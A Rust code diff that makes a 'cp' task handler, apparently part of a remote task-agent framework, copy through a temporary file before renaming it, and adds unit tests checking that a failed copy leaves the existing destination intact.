@@ -27,6 +27,29 @@ struct Params {
     allow_source_system_path: bool,
 }
 
+fn temp_path_for(dest: &Path, task_id: uuid::Uuid) -> std::path::PathBuf {
+    let mut name = dest
+        .file_name()
+        .map(|n| n.to_string_lossy().to_string())
+        .unwrap_or_else(|| "copy".into());
+    name.push_str(&format!(".nanaz-{task_id}.tmp"));
+    dest.with_file_name(name)
+}
+
+fn replace_with_temp(temp: &Path, dest: &Path) -> Result<(), String> {
+    if cfg!(windows) && dest.exists() {
+        std::fs::remove_file(dest)
+            .map_err(|e| format!("replace {} failed: {e}", display_path(dest)))?;
+    }
+    std::fs::rename(temp, dest).map_err(|e| {
+        format!(
+            "move {} to {} failed: {e}",
+            display_path(temp),
+            display_path(dest)
+        )
+    })
+}
+
 pub fn handle(task: &TaskMessage) -> TaskResponse {
     let params = match serde_json::from_str::<Params>(&task.parameters) {
         Ok(p) => p,
@@ -80,40 +103,112 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         dst.to_path_buf()
     };
 
-    match std::fs::copy(src, &actual_dst) {
-        Ok(n) => TaskResponse {
-            task_id: task.id,
-            completed: Some(true),
-            status: Some("completed".into()),
-            user_output: Some(format!(
-                "copied {} -> {} ({} bytes)",
-                display_path(src),
-                display_path(&actual_dst),
-                n
-            )),
-            artifacts: vec![
-                Artifact {
-                    base_artifact: "FileOpen".into(),
-                    artifact: display_path(src),
-                    needs_cleanup: false,
-                    resolved: true,
-                },
-                Artifact {
-                    base_artifact: "FileWrite".into(),
-                    artifact: display_path(&actual_dst),
-                    needs_cleanup: true,
-                    resolved: true,
-                },
-            ],
+    let temp_dst = temp_path_for(&actual_dst, task.id);
+    match std::fs::copy(src, &temp_dst) {
+        Ok(n) => {
+            if let Err(e) = replace_with_temp(&temp_dst, &actual_dst) {
+                let _ = std::fs::remove_file(&temp_dst);
+                return TaskResponse::failed(task.id, &e);
+            }
+            TaskResponse {
+                task_id: task.id,
+                completed: Some(true),
+                status: Some("completed".into()),
+                user_output: Some(format!(
+                    "copied {} -> {} ({} bytes)",
+                    display_path(src),
+                    display_path(&actual_dst),
+                    n
+                )),
+                artifacts: vec![
+                    Artifact {
+                        base_artifact: "FileOpen".into(),
+                        artifact: display_path(src),
+                        needs_cleanup: false,
+                        resolved: true,
+                    },
+                    Artifact {
+                        base_artifact: "FileWrite".into(),
+                        artifact: display_path(&actual_dst),
+                        needs_cleanup: true,
+                        resolved: true,
+                    },
+                ],
+                ..Default::default()
+            }
+        }
+        Err(e) => {
+            let _ = std::fs::remove_file(&temp_dst);
+            TaskResponse::failed(
+                task.id,
+                &format!(
+                    "copy {} -> {} failed: {e}",
+                    display_path(src),
+                    display_path(&actual_dst)
+                ),
+            )
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    fn unique_tmp(label: &str) -> std::path::PathBuf {
+        static COUNTER: AtomicUsize = AtomicUsize::new(0);
+        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
+        let pid = std::process::id();
+        let mut p = std::env::temp_dir();
+        p.push(format!("nanaz-cp-test-{label}-{pid}-{n}"));
+        std::fs::create_dir_all(&p).expect("create temp dir");
+        p
+    }
+
+    #[test]
+    fn test_cp_file() {
+        let dir = unique_tmp("file");
+        let src = dir.join("src.txt");
+        let dst = dir.join("dst.txt");
+        std::fs::write(&src, b"copied").unwrap();
+        let task = TaskMessage {
+            command: "cp".into(),
+            parameters: serde_json::json!({
+                "src": src.to_string_lossy(),
+                "dst": dst.to_string_lossy(),
+            })
+            .to_string(),
             ..Default::default()
-        },
-        Err(e) => TaskResponse::failed(
-            task.id,
-            &format!(
-                "copy {} -> {} failed: {e}",
-                display_path(src),
-                display_path(&actual_dst)
-            ),
-        ),
+        };
+
+        let resp = handle(&task);
+
+        assert_eq!(resp.status.as_deref(), Some("completed"));
+        assert_eq!(std::fs::read(&dst).unwrap(), b"copied");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_cp_failure_preserves_existing_destination() {
+        let dir = unique_tmp("preserve");
+        let src = dir.join("missing.txt");
+        let dst = dir.join("dst.txt");
+        std::fs::write(&dst, b"original").unwrap();
+        let task = TaskMessage {
+            command: "cp".into(),
+            parameters: serde_json::json!({
+                "src": src.to_string_lossy(),
+                "dst": dst.to_string_lossy(),
+            })
+            .to_string(),
+            ..Default::default()
+        };
+
+        let resp = handle(&task);
+
+        assert_eq!(resp.status.as_deref(), Some("error"));
+        assert_eq!(std::fs::read(&dst).unwrap(), b"original");
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
